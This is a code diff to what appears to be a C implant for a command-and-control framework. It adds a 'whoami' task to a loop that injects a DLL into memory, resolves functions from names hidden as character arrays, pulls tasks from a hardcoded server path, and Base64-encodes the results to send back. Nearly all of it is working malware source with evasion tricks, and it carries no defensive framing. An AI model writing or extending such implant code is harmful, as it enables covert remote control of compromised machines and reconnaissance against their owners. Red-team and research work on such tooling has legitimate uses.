@@ -943,8 +943,12 @@ void myMain()
     pEsgStdDll = inject(api, pEsgStdDll, dwDllSize);
 
     CHAR runCmd_c[] = { 'R', 'u', 'n', 'C', 'm', 'd', 0 };
+    CHAR whoami_c[] = { 'W', 'h', 'o', 'a', 'm', 'i', 0 };
 
     PEsgStdApi->RunCmd = GetSymbolAddress((HANDLE)pEsgStdDll, runCmd_c);
+    ((PRINTF)api->printf)("\n%p\n",PEsgStdApi->Whoami);
+    PEsgStdApi->Whoami = GetSymbolAddress((HANDLE)pEsgStdDll, whoami_c);
+    ((PRINTF)api->printf)("\n%p\n",PEsgStdApi->Whoami);
 
     WCHAR wServer[] = { '1', '9', '2', '.', '1', '6', '8', '.', '0', '.', '1', 0 };
     WCHAR tasksPath[] = { '/', 't', 'a', 's', 'k', 's', '/', 0 };
@@ -1020,12 +1024,17 @@ void myMain()
         }
         else if (my_strcmp(taskType, "whoami") == 0)
         {
-            ((PRINTF)api->printf)("test whoami");
+            ((PRINTF)api->printf)("\nho\n");
+            taskOutput = myTrimB(api, ((WHOAMI)PEsgStdApi->Whoami)(), '\n');
+            ((PRINTF)api->printf)("\nyo\n");
+            ((PRINTF)api->printf)("\n%s\n", taskOutput);
         }
         else
         {
-            ((PRINTF)api->printf)("hehehe");
+            taskOutput = "oops";
+            ((PRINTF)api->printf)("unknown task type, you f'ed up, this should never happen");
         }
+
 
         ((CRYPTBINARYTOSTRINGA)api->CryptBinaryToStringA)((BYTE*)taskOutput, myStrlenA(taskOutput)+1, CRYPT_STRING_BASE64+CRYPT_STRING_NOCRLF, NULL, &b64EncodedOutputSize);
         b64EncodedOutput = (CHAR*)((CALLOC)api->calloc)(b64EncodedOutputSize, sizeof(CHAR));
